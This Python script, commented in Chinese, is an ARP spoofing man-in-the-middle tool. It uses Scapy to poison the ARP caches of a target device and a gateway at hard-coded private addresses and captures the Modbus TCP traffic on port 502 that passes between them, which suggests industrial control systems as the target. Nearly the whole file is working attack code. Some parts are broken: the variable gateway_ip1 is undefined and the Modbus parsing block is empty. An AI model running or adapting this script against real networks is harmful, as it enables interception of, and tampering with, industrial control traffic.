from scapy.all import *
from pymodbus.client.sync import ModbusTcpClient
from scapy.config import conf
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.sendrecv import send
import os
import time
import threading
import struct

def enable_ip_forwarding():
    """启用 IP 转发"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')

def disable_ip_forwarding():
    """禁用 IP 转发"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')

def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
    """发送伪造的 ARP 包"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
    send(packet, iface=iface, verbose=False)
    print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """恢复 ARP 表"""
    print("[INFO] 恢复 ARP 表...")
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3)
    print("[INFO] ARP 恢复完成")

def get_mac(ip):
    """获取目标设备的 MAC 地址"""
    ans, _ = srp(ARP(pdst=ip), timeout=2, verbose=False)
    for _, received in ans:
        return received.hwsrc
    return None

def packet_callback(packet):
    """捕获流量并处理 Modbus TCP 流量"""

    try:
        # 检查是否为 IP 层和 TCP 层的数据包
        if packet.haslayer(IP) and packet.haslayer(TCP):
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst
            tcp_sport = packet[TCP].sport
            tcp_dport = packet[TCP].dport

            # 获取序列号和确认号
            tcp_seq = packet[TCP].seq
            tcp_ack = packet[TCP].ack

            print(f"[INFO] 捕获 TCP 流量: {ip_src} -> {ip_dst} | TCP {tcp_sport} -> {tcp_dport} | 序列号: {tcp_seq} 确认号: {tcp_ack}")

            # 只捕获 Modbus TCP 流量（目标设备和网关之间的 502 端口通信）
            if (ip_src == target_ip and ip_dst == gateway_ip1 or ip_src == gateway_ip1 and ip_dst == target_ip) and \
                    (tcp_sport == 502 or tcp_dport == 502):
                print(f"[INFO] 捕获 Modbus TCP 流量: {ip_src} -> {ip_dst} | TCP {tcp_sport} -> {tcp_dport} | 长度: {len(packet)} 字节")

                # 解析 Modbus 数据部分


    except Exception as e:
        print(f"[ERROR] 处理包时出错: {e}")

def main():
    # 配置相关信息
    global target_ip, gateway_ip
    target_ip = "192.168.88.138"  # 替换为目标设备 IP
    gateway_ip = "192.168.88.134"  # 替换为网关 IP

    # 自动选择活动接口
    iface = conf.iface  # 使用 Scapy 自动选择活动的网络接口

    if iface is None:
        print("[ERROR] 未找到有效的网络接口")
        return

    # 获取 MAC 地址
    attacker_mac = get_if_hwaddr(iface)  # 本机 MAC 地址
    target_mac = getmacbyip(target_ip)  # 目标设备原始 MAC 地址
    gateway_mac = getmacbyip(gateway_ip)  # 网关 MAC 地址

    if target_mac is None or gateway_mac is None:
        print("[ERROR] 无法获取目标或网关的 MAC 地址")
        return

    print(f"[INFO] 目标 IP: {target_ip} ({target_mac})")
    print(f"[INFO] 网关 IP: {gateway_ip} ({gateway_mac})")
    print(f"[INFO] 攻击者 MAC: {attacker_mac}")

    # 启用 IP 转发（系统会自动处理未被拦截的包）
    #enable_ip_forwarding()

    # 启动一个线程捕获目标设备和网关之间的 Modbus TCP 流量
    capture_thread = threading.Thread(
        target=lambda: sniff(iface=iface, filter="tcp port 502", prn=packet_callback, store=False))
    capture_thread.daemon = True  # 设置为守护线程，这样主线程退出时它也会自动结束
    capture_thread.start()

    try:
        print("[INFO] 开始 ARP 欺骗攻击 ...")

        while True:
            # 持续发送伪造的 ARP 包
            send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface)
            send_arp_poison(gateway_ip, gateway_mac, target_ip, attacker_mac, iface)
            time.sleep(2)  # 每隔 2 秒发送一次

    except KeyboardInterrupt:
        print("\n[INFO] 停止攻击...")
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)

    finally:
        # 禁用 IP 转发
        disable_ip_forwarding()

if __name__ == "__main__":
    main()
